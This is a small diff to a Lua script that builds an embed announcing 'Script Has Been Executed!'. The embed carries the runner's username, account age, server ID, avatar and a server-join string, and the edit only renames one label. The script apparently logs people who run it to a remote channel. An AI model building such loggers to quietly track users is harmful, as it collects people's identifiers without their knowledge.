@@ -15,7 +15,7 @@ local payload = {
     embeds = {
         {
             title = "Script Has Been Executed!",
-            description = "Username: " .. username .. "\nGame Username: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
+            description = "Username: " .. username .. "\nDisplay User: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
             color = nil,
             image = {
                 url = avatarUrl
